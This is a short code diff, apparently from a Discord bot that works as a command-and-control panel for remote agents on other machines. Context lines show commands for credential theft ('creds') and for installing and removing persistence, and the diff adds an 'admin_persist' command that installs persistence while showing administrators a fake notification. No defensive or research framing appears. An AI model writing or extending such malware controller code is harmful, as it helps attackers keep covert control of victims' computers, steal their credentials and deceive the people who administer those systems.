@@ -273,6 +273,10 @@ async def creds_command(interaction: discord.Interaction):
 @bot.tree.command(name="persist", description="Install persistence")
 async def persist_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "persist")
+    
+@bot.tree.command(name="admin_persist", description="Install persistence but with fake notication for admin")
+async def persist_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "admin_persist")
 
 @bot.tree.command(name="unpersist", description="Remove persistence")
 async def unpersist_command(interaction: discord.Interaction):
